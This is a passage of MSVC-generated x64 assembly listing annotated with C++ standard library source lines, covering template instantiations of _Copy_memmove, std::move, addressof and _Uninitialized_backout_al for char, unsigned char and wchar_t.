	call	??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z ; std::_To_address<char *>
	mov	QWORD PTR _LastPtr$[rsp], rax

; 4115 :     auto _DestPtr               = _To_address(_Dest);

	lea	rcx, QWORD PTR _Dest$[rsp]
	call	??$_To_address@PEAD@std@@YA?A_PAEBQEAD@Z ; std::_To_address<char *>
	mov	QWORD PTR _DestPtr$[rsp], rax

; 4116 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_FirstPtr));

	mov	rax, QWORD PTR _FirstPtr$[rsp]
	mov	QWORD PTR _First_ch$[rsp], rax

; 4117 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_LastPtr));

	mov	rax, QWORD PTR _LastPtr$[rsp]
	mov	QWORD PTR _Last_ch$[rsp], rax

; 4118 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<const volatile char*>(_DestPtr));

	mov	rax, QWORD PTR _DestPtr$[rsp]
	mov	QWORD PTR _Dest_ch$[rsp], rax

; 4119 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	mov	rax, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Last_ch$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Count$[rsp], rax

; 4120 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	call	memmove

; 4121 :     if constexpr (is_pointer_v<_OutCtgIt>) {
; 4122 :         return reinterpret_cast<_OutCtgIt>(_Dest_ch + _Count);

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	add	rcx, rax
	mov	rax, rcx

; 4123 :     } else {
; 4124 :         return _Dest + (_LastPtr - _FirstPtr);
; 4125 :     }
; 4126 : }

	add	rsp, 104				; 00000068H
	ret	0
??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z ENDP	; std::_Copy_memmove<char *,char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEAD@std@@YA$$QEADAEAD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAD@std@@YA$$QEADAEAD@Z PROC			; std::move<char &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
??$move@AEAD@std@@YA$$QEADAEAD@Z ENDP			; std::move<char &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z PROC	; std::_Get_unwrapped<char * const &>, COMDAT

; 1347 : _NODISCARD constexpr decltype(auto) _Get_unwrapped(_Iter&& _It) {

	mov	QWORD PTR [rsp+8], rcx

; 1348 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1349 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1350 :         return _It + 0;

	mov	rax, QWORD PTR _It$[rsp]
	mov	rax, QWORD PTR [rax]

; 1351 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1352 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1353 :     } else {
; 1354 :         return static_cast<_Iter&&>(_It);
; 1355 :     }
; 1356 : }

	ret	0
??$_Get_unwrapped@AEBQEAD@std@@YA?A_TAEBQEAD@Z ENDP	; std::_Get_unwrapped<char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z
_TEXT	SEGMENT
_It$ = 8
??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z PROC		; std::_Voidify_iter<char *>, COMDAT

; 212  : _NODISCARD constexpr void* _Voidify_iter(_Iter _It) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 213  :     if constexpr (is_pointer_v<_Iter>) {
; 214  :         return const_cast<void*>(static_cast<const volatile void*>(_It));

	mov	rax, QWORD PTR _It$[rsp]

; 215  :     } else {
; 216  :         return const_cast<void*>(static_cast<const volatile void*>(_STD addressof(*_It)));
; 217  :     }
; 218  : }

	ret	0
??$_Voidify_iter@PEAD@std@@YAPEAXPEAD@Z ENDP		; std::_Voidify_iter<char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@D@std@@YAPEADAEAD@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@D@std@@YAPEADAEAD@Z PROC			; std::addressof<char>, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@D@std@@YAPEADAEAD@Z ENDP			; std::addressof<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z
_TEXT	SEGMENT
tv64 = 32
this$ = 64
<_Vals_0>$ = 72
??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z PROC ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Emplace_back<unsigned char>, COMDAT

; 1661 :     _CONSTEXPR20 void _Emplace_back(_Types&&... _Vals) { // construct a new element at *_Last and increment

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1662 :         allocator_traits<_Alloc>::construct(_Al, _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	rcx, QWORD PTR <_Vals_0>$[rsp]
	call	??$forward@E@std@@YA$$QEAEAEAE@Z	; std::forward<unsigned char>
	mov	QWORD PTR tv64[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	call	??$_Unfancy@E@std@@YAPEAEPEAE@Z		; std::_Unfancy<unsigned char>
	mov	rcx, QWORD PTR tv64[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+16]
	call	??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z ; std::_Default_allocator_traits<std::allocator<unsigned char> >::construct<unsigned char,unsigned char>

; 1663 :         ++_Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	inc	rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+8], rax

; 1664 :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Emplace_back<unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAPEAEXZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAPEAEXZ PROC ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Release, COMDAT

; 1666 :     constexpr pointer _Release() { // suppress any exception handling backout and return _Last

	mov	QWORD PTR [rsp+8], rcx

; 1667 :         _First = _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	QWORD PTR [rax], rcx

; 1668 :         return _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]

; 1669 :     }

	ret	0
?_Release@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAPEAEXZ ENDP ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::~_Uninitialized_backout_al<std::allocator<unsigned char> >, COMDAT

; 1656 :     _CONSTEXPR20 ~_Uninitialized_backout_al() {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 1657 :         _Destroy_range(_First, _Last, _Al);

	mov	rax, QWORD PTR this$[rsp]
	mov	r8, QWORD PTR [rax+16]
	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+8]
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ; std::_Destroy_range<std::allocator<unsigned char> >

; 1658 :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::~_Uninitialized_backout_al<std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@PEAEAEAV?$allocator@E@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
_Al_$ = 24
??0?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@PEAEAEAV?$allocator@E@1@@Z PROC ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Uninitialized_backout_al<std::allocator<unsigned char> >, COMDAT

; 1651 :     _CONSTEXPR20 _Uninitialized_backout_al(pointer _Dest, _Alloc& _Al_) : _First(_Dest), _Last(_Dest), _Al(_Al_) {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Al_$[rsp]
	mov	QWORD PTR [rax+16], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@PEAEAEAV?$allocator@E@1@@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<unsigned char> >::_Uninitialized_backout_al<std::allocator<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z
_TEXT	SEGMENT
_First_ch$ = 32
_Count$ = 40
_Dest_ch$ = 48
_FirstPtr$ = 56
_LastPtr$ = 64
_DestPtr$ = 72
_Last_ch$ = 80
_First$ = 112
_Last$ = 120
_Dest$ = 128
??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z PROC	; std::_Copy_memmove<unsigned char *,unsigned char *>, COMDAT

; 4112 : _OutCtgIt _Copy_memmove(_CtgIt _First, _CtgIt _Last, _OutCtgIt _Dest) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 4113 :     auto _FirstPtr              = _To_address(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z ; std::_To_address<unsigned char *>
	mov	QWORD PTR _FirstPtr$[rsp], rax

; 4114 :     auto _LastPtr               = _To_address(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z ; std::_To_address<unsigned char *>
	mov	QWORD PTR _LastPtr$[rsp], rax

; 4115 :     auto _DestPtr               = _To_address(_Dest);

	lea	rcx, QWORD PTR _Dest$[rsp]
	call	??$_To_address@PEAE@std@@YA?A_PAEBQEAE@Z ; std::_To_address<unsigned char *>
	mov	QWORD PTR _DestPtr$[rsp], rax

; 4116 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_FirstPtr));

	mov	rax, QWORD PTR _FirstPtr$[rsp]
	mov	QWORD PTR _First_ch$[rsp], rax

; 4117 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_LastPtr));

	mov	rax, QWORD PTR _LastPtr$[rsp]
	mov	QWORD PTR _Last_ch$[rsp], rax

; 4118 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<const volatile char*>(_DestPtr));

	mov	rax, QWORD PTR _DestPtr$[rsp]
	mov	QWORD PTR _Dest_ch$[rsp], rax

; 4119 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	mov	rax, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Last_ch$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Count$[rsp], rax

; 4120 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	call	memmove

; 4121 :     if constexpr (is_pointer_v<_OutCtgIt>) {
; 4122 :         return reinterpret_cast<_OutCtgIt>(_Dest_ch + _Count);

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	add	rcx, rax
	mov	rax, rcx

; 4123 :     } else {
; 4124 :         return _Dest + (_LastPtr - _FirstPtr);
; 4125 :     }
; 4126 : }

	add	rsp, 104				; 00000068H
	ret	0
??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z ENDP	; std::_Copy_memmove<unsigned char *,unsigned char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEAE@std@@YA$$QEAEAEAE@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAE@std@@YA$$QEAEAEAE@Z PROC			; std::move<unsigned char &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
??$move@AEAE@std@@YA$$QEAEAEAE@Z ENDP			; std::move<unsigned char &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z PROC	; std::_Get_unwrapped<unsigned char * const &>, COMDAT

; 1347 : _NODISCARD constexpr decltype(auto) _Get_unwrapped(_Iter&& _It) {

	mov	QWORD PTR [rsp+8], rcx

; 1348 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1349 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1350 :         return _It + 0;

	mov	rax, QWORD PTR _It$[rsp]
	mov	rax, QWORD PTR [rax]

; 1351 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1352 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1353 :     } else {
; 1354 :         return static_cast<_Iter&&>(_It);
; 1355 :     }
; 1356 : }

	ret	0
??$_Get_unwrapped@AEBQEAE@std@@YA?A_TAEBQEAE@Z ENDP	; std::_Get_unwrapped<unsigned char * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z
_TEXT	SEGMENT
_It$ = 8
??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z PROC		; std::_Voidify_iter<unsigned char *>, COMDAT

; 212  : _NODISCARD constexpr void* _Voidify_iter(_Iter _It) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 213  :     if constexpr (is_pointer_v<_Iter>) {
; 214  :         return const_cast<void*>(static_cast<const volatile void*>(_It));

	mov	rax, QWORD PTR _It$[rsp]

; 215  :     } else {
; 216  :         return const_cast<void*>(static_cast<const volatile void*>(_STD addressof(*_It)));
; 217  :     }
; 218  : }

	ret	0
??$_Voidify_iter@PEAE@std@@YAPEAXPEAE@Z ENDP		; std::_Voidify_iter<unsigned char *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@E@std@@YAPEAEAEAE@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@E@std@@YAPEAEAEAE@Z PROC			; std::addressof<unsigned char>, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@E@std@@YAPEAEAEAE@Z ENDP			; std::addressof<unsigned char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z
_TEXT	SEGMENT
tv64 = 32
this$ = 64
<_Vals_0>$ = 72
??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>, COMDAT

; 1661 :     _CONSTEXPR20 void _Emplace_back(_Types&&... _Vals) { // construct a new element at *_Last and increment

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1662 :         allocator_traits<_Alloc>::construct(_Al, _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	rcx, QWORD PTR <_Vals_0>$[rsp]
	call	??$forward@_W@std@@YA$$QEA_WAEA_W@Z	; std::forward<wchar_t>
	mov	QWORD PTR tv64[rsp], rax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	rcx, QWORD PTR tv64[rsp]
	mov	r8, rcx
	mov	rdx, rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax+16]
	call	??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t>

; 1663 :         ++_Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]
	add	rax, 2
	mov	rcx, QWORD PTR this$[rsp]
	mov	QWORD PTR [rcx+8], rax

; 1664 :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release, COMDAT

; 1666 :     constexpr pointer _Release() { // suppress any exception handling backout and return _Last

	mov	QWORD PTR [rsp+8], rcx

; 1667 :         _First = _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+8]
	mov	QWORD PTR [rax], rcx

; 1668 :         return _Last;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+8]

; 1669 :     }

	ret	0
?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >, COMDAT

; 1656 :     _CONSTEXPR20 ~_Uninitialized_backout_al() {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 1657 :         _Destroy_range(_First, _Last, _Al);

	mov	rax, QWORD PTR this$[rsp]
	mov	r8, QWORD PTR [rax+16]
	mov	rax, QWORD PTR this$[rsp]
	mov	rdx, QWORD PTR [rax+8]
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >

; 1658 :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
_Al_$ = 24
??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >, COMDAT

; 1651 :     _CONSTEXPR20 _Uninitialized_backout_al(pointer _Dest, _Alloc& _Al_) : _First(_Dest), _Last(_Dest), _Al(_Al_) {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	QWORD PTR [rax+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Al_$[rsp]
	mov	QWORD PTR [rax+16], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z
_TEXT	SEGMENT
_First_ch$ = 32
_Count$ = 40
_Dest_ch$ = 48
_FirstPtr$ = 56
_LastPtr$ = 64
_DestPtr$ = 72
_Last_ch$ = 80
_First$ = 112
_Last$ = 120
_Dest$ = 128
??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z PROC	; std::_Copy_memmove<wchar_t *,wchar_t *>, COMDAT

; 4112 : _OutCtgIt _Copy_memmove(_CtgIt _First, _CtgIt _Last, _OutCtgIt _Dest) {

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 4113 :     auto _FirstPtr              = _To_address(_First);

	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z ; std::_To_address<wchar_t *>
	mov	QWORD PTR _FirstPtr$[rsp], rax

; 4114 :     auto _LastPtr               = _To_address(_Last);

	lea	rcx, QWORD PTR _Last$[rsp]
	call	??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z ; std::_To_address<wchar_t *>
	mov	QWORD PTR _LastPtr$[rsp], rax

; 4115 :     auto _DestPtr               = _To_address(_Dest);

	lea	rcx, QWORD PTR _Dest$[rsp]
	call	??$_To_address@PEA_W@std@@YA?A_PAEBQEA_W@Z ; std::_To_address<wchar_t *>
	mov	QWORD PTR _DestPtr$[rsp], rax

; 4116 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_FirstPtr));

	mov	rax, QWORD PTR _FirstPtr$[rsp]
	mov	QWORD PTR _First_ch$[rsp], rax

; 4117 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_LastPtr));

	mov	rax, QWORD PTR _LastPtr$[rsp]
	mov	QWORD PTR _Last_ch$[rsp], rax

; 4118 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<const volatile char*>(_DestPtr));

	mov	rax, QWORD PTR _DestPtr$[rsp]
	mov	QWORD PTR _Dest_ch$[rsp], rax

; 4119 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	mov	rax, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Last_ch$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Count$[rsp], rax

; 4120 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _First_ch$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	call	memmove

; 4121 :     if constexpr (is_pointer_v<_OutCtgIt>) {
; 4122 :         return reinterpret_cast<_OutCtgIt>(_Dest_ch + _Count);

	mov	rax, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR _Dest_ch$[rsp]
	add	rcx, rax
	mov	rax, rcx

; 4123 :     } else {
; 4124 :         return _Dest + (_LastPtr - _FirstPtr);
; 4125 :     }
; 4126 : }

	add	rsp, 104				; 00000068H
	ret	0
??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z ENDP	; std::_Copy_memmove<wchar_t *,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z PROC		; std::move<wchar_t &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
